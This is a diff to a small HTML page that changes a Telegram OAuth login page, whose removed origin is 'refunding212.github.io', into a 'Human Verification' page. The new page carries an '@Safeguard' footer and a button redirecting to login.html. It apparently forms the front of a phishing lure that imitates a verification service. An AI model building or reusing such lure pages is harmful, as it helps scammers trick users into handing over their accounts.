@@ -3,36 +3,52 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram WebApp Login</title>
+    <title>Human Verification</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
+            background-color: #121212;
+            color: white;
             text-align: center;
-            padding: 50px;
+            font-family: Arial, sans-serif;
+            margin-top: 50px;
+        }
+        h1 {
+            font-size: 24px;
+        }
+        p {
+            font-size: 16px;
         }
         button {
-            background-color: #0088cc;
-            color: white;
+            background: linear-gradient(45deg, #3b755f, #599474);
             border: none;
             padding: 10px 20px;
             font-size: 18px;
             cursor: pointer;
             border-radius: 5px;
+            color: white;
+            margin-top: 20px;
         }
         button:hover {
-            background-color: #0077b5;
+            background: linear-gradient(45deg, #599474, #3b755f);
         }
     </style>
 </head>
 <body>
-    <h1>Login with Telegram</h1>
-    <p>Click the button below to authenticate with Telegram.</p>
-    <button onclick="openTelegramLogin()">🚀 Login with Telegram</button>
+
+    <h1>Human Verification</h1>
+    <p>Verify below to be granted entry</p>
+
+    <button onclick="redirectToLogin()">Click Here</button>
 
     <script>
-        function openTelegramLogin() {
-            window.location.href = "https://oauth.telegram.org/auth?bot_id=7879598325&origin=https://refunding212.github.io/forrealcat&embed=1";
+        function redirectToLogin() {
+            window.location.href = "login.html";
         }
     </script>
+
+    <footer style="margin-top: 50px;">
+        @Safeguard
+    </footer>
+
 </body>
 </html>
